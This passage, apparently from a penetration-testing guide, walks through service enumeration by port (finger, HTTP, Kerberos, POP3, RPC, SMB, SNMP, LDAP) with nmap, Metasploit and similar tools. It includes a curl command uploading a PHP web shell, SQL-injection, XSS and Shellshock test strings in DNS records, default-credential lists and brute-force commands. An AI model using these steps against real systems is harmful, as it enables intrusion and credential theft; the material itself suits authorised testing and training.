    | asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.
    | asfdbbox.zonetransfer.me.                       A      127.0.xx.xx
    | asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.
    | canberra-office.zonetransfer.me.                A      202.14.xx.xx
    | cmdexec.zonetransfer.me.                        TXT    "; ls"
    | contact.zonetransfer.me.                        TXT    "Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
    | dc-office.zonetransfer.me.                      A      143.228.xx.xx
    | deadbeef.zonetransfer.me.                       AAAA   dead:beaf::
    | dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m
    | DZC.zonetransfer.me.                            TXT    "AbCdEfG"
    | email.zonetransfer.me.                          NAPTR  1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
    | email.zonetransfer.me.                          A      74.125.xx.xx
    | Info.zonetransfer.me.                           TXT    "ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
    | internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.
    | internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.
    | intns1.zonetransfer.me.                         A      167.88.xx.xx
    | intns2.zonetransfer.me.                         A      167.88.xx.xx
    | office.zonetransfer.me.                         A      4.23.xx.xx
    | ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332
    | owa.zonetransfer.me.                            A      207.46.xx.xx
    | robinwood.zonetransfer.me.                      TXT    "Robin Wood"
    | rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.
    | sip.zonetransfer.me.                            NAPTR  2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
    | sqli.zonetransfer.me.                           TXT    "' or 1=1 --"
    | sshock.zonetransfer.me.                         TXT    "() { :]}; echo ShellShocked"
    | staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.
    | alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx
    | testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.
    | vpn.zonetransfer.me.                            A      174.36.xx.xx
    | www.zonetransfer.me.                            A      217.147.xx.xx
    | xss.zonetransfer.me.                            TXT    "'><script>alert('Boo')</script>"
    |_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
    135/tcp  filtered msrpc
    445/tcp  filtered microsoft-ds
    8333/tcp filtered bitcoin

    Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```

# Port 69 - TFTP

This is a ftp-server but it is using UDP.

# Port 79 - Finger

## Metasploit

### Finger Service User Enumerator

Used to identify users.

    use auxiliary/scanner/finger/finger_users
    services -p 79 -u -R

Sample Output:

    [+] 172.30.xx.xx:79 - Found user: adm
    [+] 172.30.xx.xx:79 - Found user: lp
    [+] 172.30.xx.xx:79 - Found user: uucp
    [+] 172.30.xx.xx:79 - Found user: nuucp
    [+] 172.30.xx.xx:79 - Found user: listen
    [+] 172.30.xx.xx:79 - Found user: bin
    [+] 172.30.xx.xx:79 - Found user: daemon
    [+] 172.30.xx.xx:79 - Found user: gdm
    [+] 172.30.xx.xx:79 - Found user: noaccess
    [+] 172.30.xx.xx:79 - Found user: nobody
    [+] 172.30.xx.xx:79 - Found user: nobody4
    [+] 172.30.xx.xx:79 - Found user: oracle
    [+] 172.30.xx.xx:79 - Found user: postgres
    [+] 172.30.xx.xx:79 - Found user: root
    [+] 172.30.xx.xx:79 - Found user: svctag
    [+] 172.30.xx.xx:79 - Found user: sys
    [+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp

## Nmap

### Finger

<a href="https://nmap.org/nsedoc/scripts/finger.html" class="reference external">finger.nse</a> : Attempts to retrieve a list of usernames using the finger service.

Sample Output:

    Yet to run

## Other

### Patator finger user enumeration

```text
patator finger_lookup host=10.10.10.228 user=FILE0 0=/usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt --rate-limit=1 -x ignore:fgrep='no such user'
```

### finger command

Same can be done using finger command

    finger root 172.30.xx.xx
    finger: 172.30.xx.xx: no such user.
    Login: root                            Name: root
    Directory: /root                       Shell: /bin/bash
    Last login Sat Feb  6 22:43 (IST) on tty1
    No mail.
    No Plan.

Need to know weather in your city? Just do finger <a href="mailto:cityname%40graph.no" class="reference external">cityname<span>@</span>graph<span>.</span>no</a>

    finger newdelhi@graph.no
                      -= Meteogram for india/delhi/new_delhi =-
    'C                                                                   Rain
    37
    36                                 ^^^^^^^^^^^^^^^
    35                              ^^^               ^^^
    34                           =--                     ^^^
    33                        ^^^
    32                                                      ^^^
    31                  ^^^^^^                                 ^^^^^^
    30                                                               ^^^
    29^^^^^^=--^^^^^^^^^
    28
       01 02 03 04 05_06_07_08_09_10_11_12_13_14_15_16_17_18 19 20 21 22 Hour

       SW SW SW SW  W  W  W  W NW NW NW NW NW NW NW NW  W  W  W SW SW SW Wind dir.
        2  2  2  2  3  5  5  6  7  6  6  6  6  6  6  5  4  2  2  1  2  2 Wind(mps)

    Legend left axis:   - Sunny   ^ Scattered   = Clouded   =V= Thunder   # Fog
    Legend right axis:  | Rain    ! Sleet       * Snow
    [Weather forecast from yr.no, delivered by the Norwegian Meteorological Institute and the NRK.]



# Port 80 - HTTP

Info about web-vulnerabilities can be found in the next chapter [HTTP - Web Vulnerabilities](../http-web-vulnerabilities/). When enumerating HTTP, here are some of the things we should be taking note of:

* Scripting language in use \(PHP, JSP, ASP etc.\)
* Apache modules
* Hidden directories
* Robots.txt
* Database in use
* Web applications installed \(Wordpress etc.\)
* Web application behavior, i.e. where does it store or write data
* 403 errors - check user-agent
* Source code

## HTTP Enumeration

**Check server header**

First, let's start off by grabbing the web server headers

`curl -Ik http://10.10.10.140`

And source code

`curl -ik http://10.10.10.140`

Check if server supports `PUT` and whether we can upload:

`curl -v -X OPTIONS http://10.10.10.140`

`curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php`

**Checking for common misconfigurations and vulnerabilities**

`nikto -h http://10.10.10.10`

Remember to also run `nikto` against any interesting directories found. If using a proxy server then:

`nikto -h http://10.10.10.10 -useproxy http://proxy:8080`

We can also launch a few nmap NSE scripts as well to round out this phase:

`nmap -vv -sV -PN -p 80 10.10.10.10 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN 10.10.10.10_http.nse`

**Directory brute forcing**

After we have run the above enumeration techniques we should now attempt to discover any hidden directories on the server

`dirb http://10.10.10.140 -r -o 10.10.10.140_http.dirb`

`gobuster -u http://10.10.10.140 -w /usr/share/seclists/Discovery/Web_Content_common.txt -s '200,204,301,302,307,403,500' -e > 10.10.10.140.gobuster`

Failing this, it is definitely worth creating a custom wordlist with all available target data and running this through `drib` to catch anything else.

**Creating a custom wordlist**

`cewl -d 5 -m 2 http://10.10.10.140`

Remember to append any text you find inside images as to the custom wordlist as well!

**Default credentials check**

It always pays to check any login forms or web applications for default or weak credentials. A quick way to find default credentials via Google:

`site:webapplication.com password`

A small sample to check on the fly:

```text
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username> password
<username> admin
<username> username
<username> nameofservice
```

More lists available in `/usr/share/wordlists/.`

**Brute force password protected directories \(.htaccess\)**

Using `medusa`

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

**What next?**

* Search for publicly known vulnerabilities and exploits
* See chapter [Attacking the System](../http-web-vulnerabilities/attacking-the-system/) for web application attacks \(SQLi, LFI, RFI, XSS, etc\)
* Kick off a ZAP scan to detect  possible injection points

# Port 88 - Kerberos

Kerberos is a protocol that is used for network authentication. Different versions are used by \*nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.

If you already have a login to a user of that domain you might be able to escalate that privilege.

Check out:

* MS14-068

## Nmap

### krb5-enum-users

<a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html" class="reference external">krb5-enum-users.nse</a> : Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC\_ERR\_PREAUTH\_REQUIRED, signaling that the user is required to perform pre authentication.

The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.

    nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='XX-XXXT'" 10.74.251.24

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-23 12:13 IST
    Nmap scan report for ecindxxxxx.internal.vxxxxx.com (10.74.251.24)
    Host is up (0.0015s latency).
    PORT   STATE SERVICE
    88/tcp open  kerberos-sec
    | krb5-enum-users:
    | Discovered Kerberos principals
    |_    root@XX-XXXT

    Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds


# Port 110 - POP3

This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network \(or outside\) access this server to fetch their emails.

## Metasploit

Two auxiliary scanner modules

### POP3 Banner Grabber

Banner grabber for pop3

    use auxiliary/scanner/pop3/pop3_version
    services -p 110 -R -u

### POP3 Login Utility

Attempts to authenticate to an POP3 service.

    use auxiliary/scanner/pop3/pop3_login
    services -p 110 -R -u

## Nmap

Two NSEs

### POP3-capabilities

<a href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html" class="reference external">pop3-capabilities.nse</a> : Retrieves POP3 email server capabilities.

### POP3-brute

<a href="https://nmap.org/nsedoc/scripts/pop3-brute.html" class="reference external">pop3-brute.nse</a> : Tries to log into a POP3 account by guessing usernames and passwords.

    nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx

Tip

While playing one of Vulnhub machines, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.

## Other

### POP3 Commands

Once, we are connected to the POP3 Server, we can execute the below commands. Think we got some user credentials, we can read the emails of that user using POP3

    USER   Your user name for this mail server
    PASS   Your password.
    QUIT   End your session.
    STAT   Number and total size of all messages
    LIST   Message# and size of message
    RETR message#  Retrieve selected message
    DELE message#  Delete selected message
    NOOP   No-op. Keeps you connection open.
    RSET   Reset the mailbox. Undelete deleted messages.

### Interacting with the POP3 server
```text
telnet 192.168.1.105 110
USER pelle@192.168.1.105
PASS admin

List all emails
list

Retrive email number 5, for example
retr 5
```

# Port 111 - RPCBIND

RFC: 1833

Rpcbind can help us look for NFS-shares. So look out for nfs.

## Metasploit

### NFS Mount Scanner

Check for the nfs mounts using port 111

    use auxiliary/scanner/nfs/nfsmount
    services -p 111 -u -R

Sample Output:
```
    [*] Scanned  24 of 240 hosts (10% complete)
    [+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]
    [*] Scanned  48 of 240 hosts (20% complete)
    [+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]
    [+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]
    [+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]
    [*] Scanned  72 of 240 hosts (30% complete)
    [+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]
    [*] Scanned  96 of 240 hosts (40% complete)
    [+] 10.10.xx.xx NFS Export: /common []
```
## Other

### rpcinfo

rpcinfo makes an RPC call to an RPC server and reports what it finds

    rpcinfo -p IP_Address

Sample Output:

    rpcinfo -p 10.7.xx.xx
     program vers proto   port  service
      100000    2   tcp    111  portmapper
      100000    2   udp    111  portmapper
      741824    1   tcp    669
      741824    2   tcp    669
      399929    2   tcp    631

The same can be achieved using `showmount`

    showmount -a 172.30.xx.xx
    All mount points on 172.30.xx.xx:
    172.30.xx.xx:/SSSC-LOGS
    172.30.xx.xx:/sssclogs

Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with `showmount`

    for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a);
    do
           showmount -a $i >> nfs_111;
    done;

### rpcbind


    rpcbind -p 192.168.1.101

    # Ident - Port 113

    ## Nmap

    ### Auth-owners

    <a href="https://nmap.org/nsedoc/scripts/auth-owners.html" class="reference external">auth-owners.nse</a> : Attempts to find the owner of an open TCP port by querying an auth daemon which must also be open on the target system.

    ## Other

    ### Ident-user-enum

    If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by

    Sample Output

        perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515
        ident-user-enum v1.0 (http://pentestmonkey.net/tools/ident-user-enum)

        10.10.xx.xx:22         [U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]
        10.10.xx.xx:53         [U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]
        10.10.xx.xx:111        [U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]
        10.10.xx.xx:113        [U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]
        10.10.xx.xx:512        [U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]
        10.10.xx.xx:513        [U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]
        10.10.xx.xx:514        [U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]
        10.10.xx.xx:515        [U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]

    The above are base64 encoded, when decoded results in Salted\_Some\_Garbage. If anyone know what it’s appreciated.


# Port 119 - NNTP

Network News Transfer Protocol (NNTP), is used for the distribution, inquiry, retrieval, and posting of Netnews articles using a reliable stream-based mechanism. For news-reading clients, NNTP enables retrieval of news articles that are stored in a central database, giving subscribers the ability to select only those articles they wish to read.

## Commands

### CAPABILITIES

CAPABILITIES \[keyword\] allows a client to determine the capabilities of the server at any given time.

### MODE READER

MODE READER :

    Responses
    200    Posting allowed
    201    Posting prohibited
    502    Reading service permanently unavailable

### QUIT

QUIT : to disconnect the session

### LISTGROUP

LISTGROUP \[group \[range\]\] : The LISTGROUP command selects a newsgroup in the same manner as the GROUP command (see Section 6.1.1) but also provides a list of article numbers in the newsgroup. If no group is specified, the currently selected newsgroup is used.

### ARTICLE

ARTICLE message-id The ARTICLE command selects an article according to the arguments and presents the entire article (that is, the headers, an empty line, and the body, in that order) to the client

### POST

POST

    [C] POST
    [S] 340 Input article; end with <CR-LF>.<CR-LF>
    [C] From: "Demo User" <nobody@example.net>
    [C] Newsgroups: misc.test
    [C] Subject: I am just a test article
    [C] Organization: An Example Net
    [C]
    [C] This is just a test article.
    [C] .
    [S] 240 Article received OK


# Port 135 - MSRPC

Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.

## Nmap

```text
nmap -vv --script=msrpc-enum 10.10.10.130
```

```text
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Metasploit

### Endpoint Mapper Service Discovery

Module can be used to obtain information from the Endpoint Mapper service

    use auxiliary/scanner/dcerpc/endpoint_mapper

### Hidden DCERPC Service Discovery

Module will query the endpoint mapper and make a list of all ncacn\_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.

    use auxiliary/scanner/dcerpc/hidden

### Remote Management Interface Discovery

Module can be used to obtain information from the Remote Management Interface DCERPC service.

    use auxiliary/scanner/dcerpc/management

### DCERPC TCP Service Auditor

Determine what DCERPC services are accessible over a TCP port.

    use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

## Other

We can use **rpcdump** from **Impacket** to dump the RPC information. This tool can communicate over Port 135, 139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.

### rpcdump

    Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

    usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]
                      target [{445/SMB,135/TCP,139/SMB}]

    Dumps the remote RPC endpoints information

Sample Output:

```
    rpcdump.py 10.10.xx.xx
    Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

    [*] Retrieving endpoint list from 10.10.xx.xx
    [*] Trying protocol 135/TCP...
    Protocol: N/A
    Provider: iphlpsvc.dll
    UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
    Bindings:
              ncacn_np:\\ADS[\PIPE\srvsvc]
              ncacn_ip_tcp:10.10.xx.xx[49154]
              ncacn_np:\\ADS[\PIPE\atsvc]
              ncalrpc:[senssvc]
              ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
              ncalrpc:[IUserProfile2]

    Protocol: N/A
    Provider: schedsvc.dll
    UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0
    Bindings:
              ncalrpc:[senssvc]
              ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
              ncalrpc:[IUserProfile2]

    Protocol: N/A
    Provider: nsisvc.dll
    UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
    Bindings:
              ncalrpc:[LRPC-37912a0de47813b4b3]
              ncalrpc:[OLE6ECE1F6A513142EC99562256F849]

    Protocol: [MS-CMPO]: MSDTC Connection Manager:
    Provider: msdtcprx.dll
    UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0
    Bindings:
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]
              ncalrpc:[LRPC-316e773cde064c1ede]

    Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol
    Provider: spoolsv.exe
    UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
    Bindings:
              ncalrpc:[spoolss]

    Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol
    Provider: taskcomp.dll

    Protocol: N/A
    Provider: MPSSVC.dll
    UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
    Bindings:
              ncalrpc:[LRPC-5409763072e46c4586]

    [*] Received 189 endpoints.
```
# Port 139/445 - SMB/Samba

Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server. Here are some things to look for when enumerating SMB:

- Enumeration of users!
  - Leading to brute force attacks
  - Further attacks against other vectors such as login forms etc
- SMB version
  - Many versions are vulnerable and exploits available
- Anonymous access
- Misconfigured shares
  - Modify or upload files

## Connecting

For linux-users you can log in to the smb-share using smbclient, like this:

```text
smbclient -L 192.168.1.102
smbclient //192.168.1.106/tmp
smbclient \\\\192.168.1.105\\ipc$ -U john
smbclient //192.168.1.105/ipc$ -U john
```

If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.

## Mounting an SMB shares

```text
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

## Connecting with PSExec

If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.

```text
use exploit/windows/smb/psexec
```

## Nmap NSE scan

```text
nmap -vv --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.10.10.10 -p 445 -oA 10.10.10.10_smb.nse
```

## List of Nmap NSE scripts for SMB

There are several NSE scripts that can be useful, for example:

```text
ls -l /usr/share/nmap/scripts/smb*
```

```text
-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse
-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse
-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse
-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse
-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse
-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse
-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse
-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse
-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse
-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse
-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse
-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse
-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse
-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse
-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse
-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
```

## nbtscan

```text
nbtscan -r 192.168.1.1/24
```

It can be a bit buggy sometimes so run it several times to make sure it found all users.

## enum4linux

Enum4linux can be used to enumerate windows and linux machines with smb-shares.

The do all option:

```text
enum4linux -a 192.168.1.120
```

## rpcclient

You can also use rpcclient to enumerate the share.

Connect with a null-session. That is, without a user. This only works for older windows servers.

```text
rpcclient -U "" 192.168.1.101
```

Once connected you could enter commands like

```text
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
```

## Scanning the network for shares

Scanning for smb with nmap

```text
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
```

# Port 143/993 - IMAP

IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client \(like outlook\) fetches the emails from the mail-server using imap.

IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.

Port 993 is the secure port for IMAP.

# Port 161 and 162 - SNMP

Simple Network Management Protocol

SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.

SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.

You can have read-only access to the snmp often just with the community string `public`.

Common community strings

- public
- private
- community

Here is a longer list of common community strings: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt)

## MIB - Management information base

SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The "leaf" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.

### snmpwalm

```text
snmpwalk -c public -v1 192.168.1.101 #community string and which version
```

This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:

```text
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

Now we can use this to query the data we really want.

**snmpenum**

### snmp-check

This is a bit easier to use and with a lot prettier output.

```text
snmp-check -t 192.168.1.101 -c public
```

## Scan for open ports - Nmap

Since SNMP is using UDP we have to use the `-sU` flag.

```text
nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
```

## Onesixtyone

With onesixtyone you can test for open ports but also brute force community strings.  
I have had more success using onesixtyone than using nmap. So better use both.

```text

```

## Metasploit

### SNMP Community Scanner

Find the machines which are having default communtites by using SNMP Community Scanner.

    use auxiliary/scanner/snmp/snmp_login
    services -p 161 -u -R

Sample Output:
```
    [+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)
    Technical Support: http://www.cisco.com/techsupport
    Copyright (c) 1986-2007 by Cisco Systems, Inc.
    Compiled Wed 24-Oct-07 15:17 by prod_rel_team
    [*] Scanned 12 of 58 hosts (20% complete)
    [*] Scanned 18 of 58 hosts (31% complete)
    [+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
    [+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
    [*] Scanned 24 of 58 hosts (41% complete)
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    [*] Scanned 29 of 58 hosts (50% complete)
    [*] Scanned 35 of 58 hosts (60% complete)
    [*] Scanned 41 of 58 hosts (70% complete)
    [*] Scanned 47 of 58 hosts (81% complete)
    [+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
```
### SNMP Enumeration Module

Enumerate the devices for which we have found the community strings
```
    use auxiliary/scanner/snmp/snmp_enum
    creds -p 161 -R
```
Sample Output:
```
    [+] 10.11.xx.xx, Connected.
    [*] System information:

    Host IP                       : 10.11.xx.xx
    Hostname                      : X150-24t
    Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
    Contact                       : support@extremenetworks.com, +1 888 257 3000
    Location                      : -
    Uptime snmp                   : -
    Uptime system                 : 206 days, 00:20:58.04
    System date                   : -

    [*] Network information:

    IP forwarding enabled         : no
    Default TTL                   : 64
    TCP segments received         : 6842
    TCP segments sent             : 6837
    TCP segments retrans          : 0
    Input datagrams               : 243052379
    Delivered datagrams           : 192775346
    Output datagrams              : 993667
```

# Port 389/636 - LDAP

Lightweight Directory Access Protocol.  

This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. LDAP directory can be understood a bit like the windows registry. A database-tree. LDAP is sometimes used to store user information and is used more often used in corporate structure.

Web applications can use ldap for authentication. If that is the case it is possible to perform **ldap-injections** which are similar to SQL injections.

You can sometimes access LDAP using a anonymous login. This can be useful because you might find some valuable data, about users.

Port 636 is used for SSL.

## Nmap

### LDAP-rootdse

